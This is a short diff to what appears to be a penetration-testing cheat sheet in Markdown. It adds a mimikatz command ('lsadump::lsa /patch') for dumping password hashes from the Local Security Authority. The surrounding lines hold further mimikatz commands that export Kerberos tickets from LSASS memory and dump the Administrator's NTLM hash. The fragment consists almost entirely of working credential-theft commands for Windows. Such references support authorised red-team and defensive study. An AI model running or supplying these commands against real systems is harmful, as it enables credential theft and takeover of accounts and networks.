@@ -422,6 +422,11 @@ dump TGT from LSASS memory
 mimikatz
 sekurlsa::tickets /export
 ```
+dump hash
+```
+mimikatz # lsadump::lsa /patch
+```
+
 dump NTLM hash of admin account
 ```
 mimikatz # lsadump::lsa /inject /name:Administrator
